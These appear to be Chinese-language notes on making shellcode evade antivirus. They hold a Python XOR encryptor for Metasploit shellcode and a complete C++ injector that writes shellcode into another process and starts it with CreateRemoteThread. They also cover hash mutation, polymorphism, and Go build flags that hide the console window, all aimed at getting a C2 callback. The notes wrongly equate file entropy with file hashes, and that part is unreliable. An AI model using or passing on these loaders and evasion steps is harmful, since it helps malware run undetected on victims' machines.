# 一、Shellcode免杀
## （1）Shellcode 混淆免杀
- Shellcode 混淆简介
其实就是把我们的 shellcode 进行加密：如 base64，xor，AES 等等
- 具体实现过程
1. 生成 shellcode 
2. 把 shellcode 加密 
3. 构造 shellcode 加载器 
4. shellcode 加载器把我们加密过后的 shellcode 解密 
5. 执行程序，上线 C2 服务器

## （2）Shellcode 分离免杀
分离免杀实际上就是将我们的 shellcode 和加载器分离，首先通过加载器读取文件中的 shellcode，然后加载进内存执行，在这个过程中我们的 shellcode 并不在加载器中，而是一个静态文件(图片，二进制文件等),所以杀软并不会查杀这些静态文件，仅仅对加载器查杀，那么我们只需 考虑对加载器进行免杀即可。

## （6）base-loader-xor-py
```python
# 定义异或加密函数，接收原始shellcode和密钥作为输入
def xor_encrypt(shellcode, key):
    encrypted_shellcode = bytearray()
    key_len = len(key)

    # 遍历shellcode中的每个字节
    for i in range(len(shellcode)):
        # 将当前字节与密钥中相应字节进行异或操作，然后添加到加密后的shellcode中
        # 这段代码中的i % key_len操作用于确保在对shellcode进行异或加密时，密钥循环使用
        encrypted_shellcode.append(shellcode[i] ^ key[i % key_len])
    return encrypted_shellcode

def main():
    # msf生成的shellcode
    buf = b"\xfc\x48\x83\xe4\xf0\x00\x41\x51\x41\x50......\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5"

    shellcode = bytearray(buf)

    # 定义密钥
    key = bytearray(b'mingy123456aa+-==@asd')

    # 使用xor_encrypt函数加密shellcode
    encrypted_shellcode = xor_encrypt(shellcode, key)

    # 输出加密后的shellcode
    print("Encrypted shellcode:")
    encrypted_shellcode_string = ""
    for byte in encrypted_shellcode:
        encrypted_shellcode_string += ("\\x%02x"%byte)
    print(encrypted_shellcode_string)

if __name__ == '__main__':
    main()
```

## （8）base-loader-inject
- shellcode 进程注入 
- OpenProcess 获取其他进程访问权限的函数
- VirtualAllocEx 跨进程内存分配函数
- CreateRemoteThread 在其他进程的虚拟地址空间中创建线程
```c++
#include <stdio.h>
#include <windows.h>

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
......
"\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";

BOOL InjectShellCode(int Pid)
{
    HANDLE Handle, remoteThread;
    PVOID remoteBuffer;

    Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);

    remoteBuffer = VirtualAllocEx(Handle, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(Handle, remoteBuffer, buf, sizeof(buf), NULL);
    remoteThread = CreateRemoteThread(Handle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(Handle);
    return TRUE;
}

int main(int argc, char *argv[])
{
    char *p;
    int pid;
    errno = 0;
    long conv = strtol(argv[1], &p, 10);

    // 检查错误：例如，输入的是字符串而不是整数，或者输入的整数超过int范围
    if (errno != 0 || *p != '\0' || conv > INT_MAX || conv < INT_MIN) {
        return 1;
    } else {
        pid = conv;
        printf("%d\n", pid);
    }
    InjectShellCode(pid);
    return 0;
}
```

## （3）文件熵值
文件熵值（通常称为文件哈希值）在免杀技术中扮演着重要角色。以下是关于文件嫡值与免杀技术的要点：
### 1）基本概念
1. 文件熵值/ 哈希值：通过算法（如MD5、SHA1、SHA256等）计算出的文件唯一指纹 
2. 免杀：绕过杀毒软件检测的技术手段

### 2）免杀中利用文件熵值的方式
1. 哈希值变异： 
- 轻微修改文件内容（如添加空白字符）即可改变哈希值 
- 使杀毒软件无法通过已知恶意文件的哈希黑名单进行检测 
2. 多态技术： 
- 每次执行时自动改变文件内容（和哈希值） 
- 保持功能不变但每次生成的样本哈希都不同

## （7）Golang 编译参数
1. 去除路径 
在不添加参数的情况下，编译的程序会自带目录，可以通过`-trimpath` 参数来去除路径
2. 缩小文件
通过 `-ldflags="-s -w"`，参数可以缩小编译后的文件大小
3. 隐藏 DOS 框
```
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -trimpath -ldflags="-s -w -H=windowsgui"
```
